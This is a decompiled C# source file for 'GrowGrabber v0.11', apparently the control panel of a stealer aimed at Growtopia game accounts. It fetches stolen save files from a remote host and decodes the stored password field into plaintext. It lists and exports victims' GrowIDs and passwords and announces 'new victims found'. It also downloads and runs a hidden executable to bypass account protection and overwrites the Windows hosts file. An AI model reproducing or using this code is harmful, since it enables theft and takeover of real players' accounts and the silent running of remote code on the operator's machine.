using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DevExpress.LookAndFeel;
using DevExpress.XtraBars;
using DevExpress.XtraBars.Helpers;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using GrowGrabber.Properties;
using Microsoft.Win32;

namespace GrowGrabber
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : XtraForm
	{
		// Token: 0x06000004 RID: 4 RVA: 0x00002160 File Offset: 0x00000360
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021B0 File Offset: 0x000003B0
		public async Task gimmehaxigiveucrash()
		{
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000021F0 File Offset: 0x000003F0
		private void Form1_Load(object sender, EventArgs e)
		{
			if (File.Exists("skin.json"))
			{
				base.LookAndFeel.SetSkinStyle(File.ReadAllText("skin.json"));
			}
			if (!this.fakmode)
			{
				this.ddToolStripMenuItem.GetCurrentParent().BackColor = Color.FromArgb(33, 33, 33);
				this.savedatToolStripMenuItem.ForeColor = Color.White;
				this.ddToolStripMenuItem.ForeColor = Color.White;
				this.savedatToolStripMenuItem.Image = Resources.unnamed;
				this.ddToolStripMenuItem.Image = Resources.unnamed;
				this.backgroundWorker2.RunWorkerAsync(this.gimmehaxigiveucrash());
				RegistryKey seria = Registry.CurrentUser.OpenSubKey("GFD", true);
				this.serial = seria.GetValue("user").ToString();
				SkinHelper.InitSkinPopupMenu(this.sks);
				this.listBoxControl1.Items.Clear();
				List<string> lines = new List<string>();
				if (Directory.Exists("Utils"))
				{
					if (!File.Exists("Utils/aap.exe"))
					{
						new WebClient().DownloadFile("https://github.com/HirakoShiniji/server-csgo/raw/master/aap.exe", "Utils/aap.exe");
					}
				}
				else
				{
					Directory.CreateDirectory("Utils");
					if (!File.Exists("Utils/aap.exe"))
					{
						new WebClient().DownloadFile("https://github.com/HirakoShiniji/server-csgo/raw/master/aap.exe", "Utils/aap.exe");
						File.SetAttributes("Utils/aap.exe", FileAttributes.Hidden);
					}
				}
				this.listBoxControl1.Items.Add("ID|GrowID|Last World|Premium|");
				new WebClient().DownloadFile(string.Concat(new string[]
				{
					"http://growgrabber.atwebpages.com/SFW/",
					this.serial,
					"/",
					this.serial,
					".txt"
				}), "db.txt");
				using (StreamReader r = new StreamReader("db.txt"))
				{
					string line;
					while ((line = r.ReadLine()) != null)
					{
						lines.Add(line);
						new WebClient().DownloadFile("http://growgrabber.atwebpages.com/SFW/" + this.serial + "/netids.txt", "sid.txt");
						new string(this.listBoxControl1.Text.Where(new Func<char, bool>(char.IsLetter)).ToArray<char>());
						File.ReadLines("sid.txt").Count<string>();
						foreach (string text in File.ReadAllLines("db.txt"))
						{
							using (StreamReader reader = File.OpenText("db.txt"))
							{
								int lineNum = 0;
								while (reader.ReadLine() != null)
								{
									lineNum++;
								}
							}
						}
					}
					string[] array = File.ReadAllLines("sid.txt");
					int i = 0;
					if (i < array.Length)
					{
						string text2 = array[i];
						int counter = 0;
						StreamReader file = new StreamReader("sid.txt");
						string linez;
						while ((linez = file.ReadLine()) != null)
						{
							counter++;
							string text3 = new WebClient().DownloadString(string.Concat(new string[]
							{
								"http://growgrabber.atwebpages.com/SFW/",
								this.serial,
								"/",
								linez,
								"_pass.txt"
							}));
							Regex pattern = new Regex("[^\\w0-9]");
							string cleardata = text3.Replace("\0", " ");
							if (pattern.Replace(cleardata.Substring(cleardata.IndexOf("premium_subscription") + "premium_subscription".Length).Split(new char[]
							{
								' '
							})[3], string.Empty) == "")
							{
								this.listBoxControl1.Items.Add(string.Concat(new string[]
								{
									linez,
									"|",
									pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
									{
										' '
									})[3], string.Empty),
									"|",
									pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
									{
										' '
									})[3], string.Empty),
									"|false|"
								}));
							}
							else
							{
								this.listBoxControl1.Items.Add(string.Concat(new string[]
								{
									linez,
									"|",
									pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
									{
										' '
									})[3], string.Empty),
									"|",
									pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
									{
										' '
									})[3], string.Empty),
									"|true|"
								}));
							}
						}
						file.Close();
						Console.WriteLine("There were {0} lines.", counter);
						Console.ReadLine();
					}
					this.oldsize = this.listBoxControl1.Items.Count;
				}
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002750 File Offset: 0x00000950
		private void skinDropDownButtonItem1_ItemClick(object sender, ItemClickEventArgs e)
		{
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002752 File Offset: 0x00000952
		private void barButtonItem3_ItemClick(object sender, ItemClickEventArgs e)
		{
			Form2 form = new Form2();
			form.fuckgen();
			form.ShowDialog();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002765 File Offset: 0x00000965
		private void sks_ItemClick(object sender, ItemClickEventArgs e)
		{
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002767 File Offset: 0x00000967
		private void sks_GetItemData(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000B RID: 11 RVA: 0x0000276C File Offset: 0x0000096C
		private void barButtonItem4_ItemClick(object sender, ItemClickEventArgs e)
		{
			WebRequest webRequest = WebRequest.Create(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}));
			webRequest.Proxy = null;
			new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
			this.listBoxControl1.Items.Clear();
			this.listBoxControl1.Items.Add("ID|GrowID|Last World|Premium|");
			List<string> lines = new List<string>();
			new WebClient().DownloadFile(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}), "db.txt");
			using (StreamReader r = new StreamReader("db.txt"))
			{
				string line;
				while ((line = r.ReadLine()) != null)
				{
					lines.Add(line);
					new WebClient().DownloadFile("http://growgrabber.atwebpages.com/SFW/" + this.serial + "/netids.txt", "sid.txt");
					new string(this.listBoxControl1.Text.Where(new Func<char, bool>(char.IsLetter)).ToArray<char>());
					File.ReadLines("sid.txt").Count<string>();
					foreach (string text in File.ReadAllLines("db.txt"))
					{
						using (StreamReader reader = File.OpenText("db.txt"))
						{
							int lineNum = 0;
							while (reader.ReadLine() != null)
							{
								lineNum++;
							}
						}
					}
				}
				string[] array = File.ReadAllLines("sid.txt");
				int i = 0;
				if (i < array.Length)
				{
					string text2 = array[i];
					int counter = 0;
					StreamReader file = new StreamReader("sid.txt");
					string linez;
					while ((linez = file.ReadLine()) != null)
					{
						counter++;
						string text3 = new WebClient().DownloadString(string.Concat(new string[]
						{
							"http://growgrabber.atwebpages.com/SFW/",
							this.serial,
							"/",
							linez,
							"_pass.txt"
						}));
						Regex pattern = new Regex("[^\\w0-9]");
						string cleardata = text3.Replace("\0", " ");
						if (pattern.Replace(cleardata.Substring(cleardata.IndexOf("premium_subscription") + "premium_subscription".Length).Split(new char[]
						{
							' '
						})[3], string.Empty) == "")
						{
							this.listBoxControl1.Items.Add(string.Concat(new string[]
							{
								linez,
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|false|"
							}));
						}
						else
						{
							this.listBoxControl1.Items.Add(string.Concat(new string[]
							{
								linez,
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|true|"
							}));
						}
					}
					file.Close();
					Console.WriteLine("There were {0} lines.", counter);
					Console.ReadLine();
				}
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002BD8 File Offset: 0x00000DD8
		public List<string> PPW(byte[] contents)
		{
			List<string> result;
			try
			{
				string text = "";
				foreach (byte b in contents)
				{
					string text2 = b.ToString("X2");
					if (text2 == "00")
					{
						text += "<>";
					}
					else
					{
						text += text2;
					}
				}
				if (text.Contains("74616E6B69645F70617373776F7264"))
				{
					string text3 = "74616E6B69645F70617373776F7264";
					int num = text.IndexOf(text3);
					int num2 = text.LastIndexOf(text3);
					string text4;
					if (false)
					{
						text4 = string.Empty;
					}
					num += text3.Length;
					int num3 = text.IndexOf("<><><>", num);
					if (false)
					{
						text4 = string.Empty;
					}
					if (((Encoding.UTF8.GetString(this.StringToByteArray(text.Substring(num, num3 - num).Trim())).ToCharArray()[0] == '_') ? 1 : 0) == 0)
					{
						text4 = text.Substring(num, num3 - num).Trim();
					}
					else
					{
						num2 += text3.Length;
						num3 = text.IndexOf("<><><>", num2);
						text4 = text.Substring(num2, num3 - num2).Trim();
					}
					string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
					int num4 = text.IndexOf(text5);
					string text6;
					if (false)
					{
						text6 = string.Empty;
					}
					num4 += text5.Length;
					int num5 = text.IndexOf("<><><>", num4);
					if (false)
					{
						text6 = string.Empty;
					}
					text6 = text.Substring(num4, num5 - num4).Trim();
					int num6 = (int)this.StringToByteArray(text4)[0];
					text6 = text6.Substring(0, num6 * 2);
					byte[] array = this.StringToByteArray(text6.Replace("<>", "00"));
					List<byte> list = new List<byte>();
					List<byte> list2 = new List<byte>();
					byte b2 = 48 - array[0];
					foreach (byte b3 in array)
					{
						list.Add(b2 + b3);
					}
					for (int k = 0; k < list.Count; k++)
					{
						list2.Add((byte)((int)(list[k] - 1) - k));
					}
					List<string> list3 = new List<string>();
					for (int num7 = 0; num7 <= 255; num7++)
					{
						string text7 = "";
						foreach (byte b4 in list2)
						{
							if (this.ValidateChar((char)((byte)((int)b4 + num7))))
							{
								text7 += ((char)((byte)((int)b4 + num7))).ToString();
							}
						}
						if (text7.Length == num6)
						{
							list3.Add(text7);
						}
					}
					result = list3;
				}
				else
				{
					result = null;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002EE0 File Offset: 0x000010E0
		public byte[] StringToByteArray(string str)
		{
			Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
			for (int i = 0; i <= 255; i++)
			{
				hexindex.Add(i.ToString("X2"), (byte)i);
			}
			List<byte> hexres = new List<byte>();
			for (int j = 0; j < str.Length; j += 2)
			{
				hexres.Add(hexindex[str.Substring(j, 2)]);
			}
			return hexres.ToArray();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002F48 File Offset: 0x00001148
		private bool ValidateChar(char cdzdshr)
		{
			return (cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z') || (cdzdshr >= '+' && cdzdshr <= '.');
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002F78 File Offset: 0x00001178
		public string[] Func(byte[] lel)
		{
			return this.PPW(lel).ToArray();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002F94 File Offset: 0x00001194
		private void listBoxControl1_SelectedValueChanged(object sender, EventArgs e)
		{
			try
			{
				if (this.listBoxControl1.Text == "ID|GrowID|Last World|Premium|")
				{
					this.labelControl2.Text = "GrowID:";
					this.labelControl3.Text = "Lastworld:";
					this.labelControl4.Text = "Guest:";
					this.labelControl5.Text = "Playing:";
					this.listBoxControl2.Items.Clear();
				}
				else
				{
					string a = this.listBoxControl1.Text.Substring(0, 6);
					string b = string.Empty;
					for (int i = 0; i < a.Length; i++)
					{
						if (char.IsDigit(a[i]))
						{
							b += a[i].ToString();
						}
					}
					if (b.Length > 0)
					{
						int.Parse(b);
					}
					this.digit = b;
					this.listBoxControl2.Items.Clear();
					string realpass = "";
					this.hack = b;
					new string(this.listBoxControl1.Text.Where(new Func<char, bool>(char.IsLetter)).ToArray<char>());
					Regex pattern = new Regex("[^\\w0-9]");
					string shit = new WebClient().DownloadString(string.Concat(new string[]
					{
						"http://growgrabber.atwebpages.com/SFW/",
						this.serial,
						"/",
						this.digit,
						"_pass.txt"
					}));
					string cleardata = shit.Replace("\0", " ");
					foreach (string pw in this.Func(Encoding.Default.GetBytes(shit)))
					{
						this.listBoxControl2.Items.Add(pw);
						realpass = pw;
					}
					int lol = this.listBoxControl1.Items.Count - 1;
					string dusd = lol.ToString();
					if (this.listBoxControl1.Text.Contains("ID|GrowID|Last World|Premium|"))
					{
						int asdf = this.listBoxControl1.SelectedIndex + 1;
						this.label1.Text = string.Concat(new string[]
						{
							"Selected (",
							asdf.ToString(),
							"/",
							lol.ToString(),
							")"
						});
					}
					else
					{
						this.label1.Text = string.Concat(new string[]
						{
							"Selected (",
							this.listBoxControl1.SelectedIndex.ToString(),
							"/",
							dusd,
							") Account: (",
							pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
							{
								' '
							})[3], string.Empty),
							"/",
							realpass,
							")"
						});
					}
					this.labelControl2.Text = "GrowID: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					this.labelControl3.Text = "Last World: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					this.labelControl4.Text = "Guest: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("name") + "name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					if (pattern.Replace(cleardata.Substring(cleardata.IndexOf("isPayingUser") + "isPayingUser".Length).Split(new char[]
					{
						' '
					})[3], string.Empty) == "0")
					{
						this.labelControl5.Text = "Playing: NO";
					}
					else
					{
						this.labelControl5.Text = "Playing: YES";
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00003404 File Offset: 0x00001604
		private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			this.gimmehaxigiveucrash();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000340D File Offset: 0x0000160D
		private void barButtonItem5_ItemClick(object sender, ItemClickEventArgs e)
		{
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000340F File Offset: 0x0000160F
		private void listBoxControl1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003411 File Offset: 0x00001611
		private void listBoxControl1_MouseDown(object sender, MouseEventArgs e)
		{
			if (Control.MouseButtons == MouseButtons.Right)
			{
				this.contextMenuStrip1.Show(this.listBoxControl1, e.X, e.Y);
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000343C File Offset: 0x0000163C
		private void simpleButton3_Click(object sender, EventArgs e)
		{
			MessageBox.Show(new WebClient().DownloadString(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.hack,
				"_pass.txt"
			})));
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000348E File Offset: 0x0000168E
		private void barButtonItem8_ItemClick(object sender, ItemClickEventArgs e)
		{
			new Form4().Show();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000349A File Offset: 0x0000169A
		private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000018 RID: 24 RVA: 0x0000349C File Offset: 0x0000169C
		private void timer1_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000034A0 File Offset: 0x000016A0
		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.label1.Text = "Status: Receiving Data.. (Updating Account(s) Data)";
			Thread.Sleep(600);
			WebRequest webRequest = WebRequest.Create(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}));
			webRequest.Proxy = null;
			new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
			this.listBoxControl1.Items.Clear();
			this.listBoxControl1.Items.Add("ID|GrowID|Last World|Premium|");
			List<string> lines = new List<string>();
			new WebClient().DownloadFile(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}), "db.txt");
			int i;
			using (StreamReader r = new StreamReader("db.txt"))
			{
				string line;
				while ((line = r.ReadLine()) != null)
				{
					lines.Add(line);
					new WebClient().DownloadFile("http://growgrabber.atwebpages.com/SFW/" + this.serial + "/netids.txt", "sid.txt");
					new string(this.listBoxControl1.Text.Where(new Func<char, bool>(char.IsLetter)).ToArray<char>());
					File.ReadLines("sid.txt").Count<string>();
					foreach (string text in File.ReadAllLines("db.txt"))
					{
						using (StreamReader reader = File.OpenText("db.txt"))
						{
							int lineNum = 0;
							while (reader.ReadLine() != null)
							{
								lineNum++;
							}
						}
					}
				}
				string[] array = File.ReadAllLines("sid.txt");
				i = 0;
				if (i < array.Length)
				{
					string text2 = array[i];
					int counter = 0;
					StreamReader file = new StreamReader("sid.txt");
					string linez;
					while ((linez = file.ReadLine()) != null)
					{
						counter++;
						string text3 = new WebClient().DownloadString(string.Concat(new string[]
						{
							"http://growgrabber.atwebpages.com/SFW/",
							this.serial,
							"/",
							linez,
							"_pass.txt"
						}));
						Regex pattern = new Regex("[^\\w0-9]");
						string cleardata = text3.Replace("\0", " ");
						if (pattern.Replace(cleardata.Substring(cleardata.IndexOf("premium_subscription") + "premium_subscription".Length).Split(new char[]
						{
							' '
						})[3], string.Empty) == "")
						{
							this.listBoxControl1.Items.Add(string.Concat(new string[]
							{
								linez,
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|false|"
							}));
						}
						else
						{
							this.listBoxControl1.Items.Add(string.Concat(new string[]
							{
								linez,
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|",
								pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
								{
									' '
								})[3], string.Empty),
								"|true|"
							}));
						}
					}
					file.Close();
					Console.WriteLine("There were {0} lines.", counter);
					Console.ReadLine();
				}
			}
			this.newsize = this.listBoxControl1.Items.Count;
			if (this.newsize > this.oldsize)
			{
				this.oldsize = this.newsize;
				this.notifyIcon1.BalloonTipTitle = "GrowGrabber v0.11";
				this.notifyIcon1.BalloonTipText = "There are some new victims found\nhave fun!";
				this.notifyIcon1.Visible = true;
				this.notifyIcon1.ShowBalloonTip(1000);
			}
			else
			{
				this.notifyIcon1.BalloonTipTitle = "GrowGrabber v0.11";
				this.notifyIcon1.BalloonTipText = "Client check was successfull\nbut there are no new clients have fun!";
				this.notifyIcon1.Visible = true;
				this.notifyIcon1.ShowBalloonTip(1000);
			}
			Control control = this.label1;
			string[] array2 = new string[5];
			array2[0] = "Selected (";
			int num = 1;
			i = this.listBoxControl1.ItemCount;
			array2[num] = i.ToString();
			array2[2] = "/";
			int num2 = 3;
			i = this.listBoxControl1.Items.Count;
			array2[num2] = i.ToString();
			array2[4] = ")";
			control.Text = string.Concat(array2);
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003A34 File Offset: 0x00001C34
		private void saveDataToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003A36 File Offset: 0x00001C36
		private void barButtonItem6_ItemClick(object sender, ItemClickEventArgs e)
		{
			new Form6().Show();
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003A42 File Offset: 0x00001C42
		private void exportToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003A44 File Offset: 0x00001C44
		private void ddToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Directory.Exists("Exports"))
			{
				Regex pattern = new Regex("[^\\w0-9]");
				string shit = new WebClient().DownloadString(string.Concat(new string[]
				{
					"http://growgrabber.atwebpages.com/SFW/",
					this.serial,
					"/",
					this.digit,
					"_pass.txt"
				}));
				string cleardata = shit.Replace("\0", " ");
				foreach (string pw in this.Func(Encoding.Default.GetBytes(shit)))
				{
					File.WriteAllText("Exports/Account/" + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty) + ".txt", string.Concat(new string[]
					{
						"-*- GrowGrabber Account Data -*-\nGrowID: ",
						pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
						{
							' '
						})[3], string.Empty),
						"\nPassword: ",
						pw,
						"\n-*END OF LINE*-"
					}));
				}
				new msgbox
				{
					str1 = "1 account(s) has been successfully exported to",
					str2 = Application.StartupPath + "\n/Exports/Account/" + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty) + ".txt",
					icol = "info"
				}.Show();
				return;
			}
			Directory.CreateDirectory("Exports");
			Directory.CreateDirectory("Exports/Account");
			Regex pattern2 = new Regex("[^\\w0-9]");
			string shit2 = new WebClient().DownloadString(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.digit,
				"_pass.txt"
			}));
			string cleardata2 = shit2.Replace("\0", " ");
			foreach (string pw2 in this.Func(Encoding.Default.GetBytes(shit2)))
			{
				File.WriteAllText("Exports/Account/" + pattern2.Replace(cleardata2.Substring(cleardata2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
				{
					' '
				})[3], string.Empty) + ".txt", string.Concat(new string[]
				{
					"-*- GrowGrabber Account Data -*-\nGrowID: ",
					pattern2.Replace(cleardata2.Substring(cleardata2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty),
					"\nPassword: ",
					pw2,
					"\n-*END OF LINE*-"
				}));
			}
			new msgbox
			{
				str1 = "1 account(s) has been successfully exported to",
				str2 = Application.StartupPath + "\n/Exports/Account/" + pattern2.Replace(cleardata2.Substring(cleardata2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
				{
					' '
				})[3], string.Empty) + ".txt",
				icol = "info"
			}.Show();
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003DF4 File Offset: 0x00001FF4
		private void exporToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003DF6 File Offset: 0x00001FF6
		private void savedatToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003DF8 File Offset: 0x00001FF8
		private void removeFromServerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string shit = new WebClient().DownloadString(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}));
			string myString = shit.Remove(shit.IndexOf(this.listBoxControl1.Text), this.listBoxControl1.Text.Length);
			File.WriteAllText(this.serial + ".txt", shit.Replace(this.listBoxControl1.Text, myString));
			new WebClient().UploadFile("http://growgrabber.atwebpages.com/SFW/" + this.serial + "/", this.serial + ".txt");
			File.Delete(this.serial + ".txt");
			this.listBoxControl1.Items.Clear();
			List<string> lines = new List<string>();
			new WebClient().DownloadFile(string.Concat(new string[]
			{
				"http://growgrabber.atwebpages.com/SFW/",
				this.serial,
				"/",
				this.serial,
				".txt"
			}), "db.txt");
			using (StreamReader r = new StreamReader("db.txt"))
			{
				string line;
				while ((line = r.ReadLine()) != null)
				{
					lines.Add(line);
					this.listBoxControl1.Items.Add(line);
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003F84 File Offset: 0x00002184
		private void Form1_Resize(object sender, EventArgs e)
		{
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003F88 File Offset: 0x00002188
		private void aAPBypassToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new msgbox();
			if (!this.aap)
			{
				this.aap = true;
				Process.Start(new ProcessStartInfo
				{
					FileName = "C:\\Users\\Hirako\\source\\repos\\GrowGrabber\\GrowGrabber\\bin\\Release\\Utils\\aap.exe",
					WindowStyle = ProcessWindowStyle.Hidden
				});
				File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 growtopia1.com\n127.0.0.1 growtopia2.com");
				this.aAPBypassToolStripMenuItem.Text = "AAP Bypass [ON]";
				this.notifyIcon1.BalloonTipTitle = "GrowGrabber v0.11";
				this.notifyIcon1.BalloonTipText = "Advanced Account Protection bypass was enabled have fun!";
				this.notifyIcon1.Visible = true;
				this.notifyIcon1.ShowBalloonTip(1000);
				return;
			}
			this.aap = false;
			this.notifyIcon1.BalloonTipTitle = "GrowGrabber v0.11";
			this.notifyIcon1.BalloonTipText = "Advanced Account Protection bypass was disabled!\nyou need to enable again to play.";
			this.notifyIcon1.Visible = true;
			this.notifyIcon1.ShowBalloonTip(1000);
			this.aAPBypassToolStripMenuItem.Text = "AAP Bypass [OFF]";
			Process.GetProcessesByName("aap")[0].Kill();
			File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "");
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00004099 File Offset: 0x00002299
		private void listBoxControl1_MouseHover(object sender, EventArgs e)
		{
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000409B File Offset: 0x0000229B
		private void listBoxControl1_MouseCaptureChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000025 RID: 37 RVA: 0x0000409D File Offset: 0x0000229D
		private void listBoxControl1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000026 RID: 38 RVA: 0x0000409F File Offset: 0x0000229F
		private void barButtonItem9_ItemClick(object sender, ItemClickEventArgs e)
		{
			File.WriteAllText("skin.json", UserLookAndFeel.Default.SkinName);
		}

		// Token: 0x04000001 RID: 1
		private string version = "13";

		// Token: 0x04000002 RID: 2
		private string serial = "";

		// Token: 0x04000003 RID: 3
		public bool fakmode;

		// Token: 0x04000004 RID: 4
		private string digit = "";

		// Token: 0x04000005 RID: 5
		private string hack = "";

		// Token: 0x04000006 RID: 6
		public string licensekey = "34234242.txt";

		// Token: 0x04000007 RID: 7
		public bool lol;

		// Token: 0x04000008 RID: 8
		private int oldsize;

		// Token: 0x04000009 RID: 9
		private int newsize;

		// Token: 0x0400000A RID: 10
		private bool aap;
	}
}
